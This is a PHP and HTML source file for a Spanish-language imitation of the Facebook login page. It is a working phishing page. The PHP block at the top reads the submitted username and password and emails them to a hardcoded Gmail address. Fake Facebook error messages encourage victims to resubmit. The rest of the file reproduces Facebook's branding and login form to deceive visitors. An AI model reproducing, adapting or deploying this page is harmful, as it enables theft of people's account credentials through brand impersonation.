<html>
<head>
<title>Facebook - Entrar o registrase</title>
<link rel="stylesheet" href="css/estilos.css">
<link type="x/icon" rel="icon" href="icon/facebook logo.png">
<meta charset="utf-8">
</head>
<body>

<?php

$correo = "diegomatute77@gmail.com";
$user = $_POST["user"];
$password = $_POST["password"];

if (empty($user)) {
    echo "<p style='color:red;'>El correo electrónico o número de móvil que has introducido no está conectado a una cuenta.</p>";
} else if (empty($password)) {
    echo "<p style='color:red;'>La contraseña que has introducido es incorrecta.</p>";
} else{

  mail($correo, "Cuenta de facebook", "el usuario es: $user", "La contraseña es: $password");
}

?>

<div class="contenedor"> 

  <div class="text-facebook"> 
      <div class="img"><img src="icon/facebook.svg" width="100%"></div>
      <p class="text-intro">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>     
  </div>
    

  <div class="formulario">
  <form method="post" action="<?php $_SERVER["PHP_SELF"]?>">
   
   <input style="margin-top:20px;" class="input-text" type="text" name="user" placeholder="Correo electronico o numero de telefono"><br/><br/>
   <input class="input-text" type="password" name="password" placeholder="Contraseña"> <br/><br/>

   <input class="button-enviar" type="submit" value="Entrar">

  </form>
  <br/>


  <a href="#">¿Has olvidado la contraseña?</a><br/><br/>

  <center>
  <div class="linea"></div>
  </center>


  <div class="button-crearCuenta"><center><b class="text">Crear cuenta nueva</b></center></div>


  </div>
   

</div>


</body>
</html>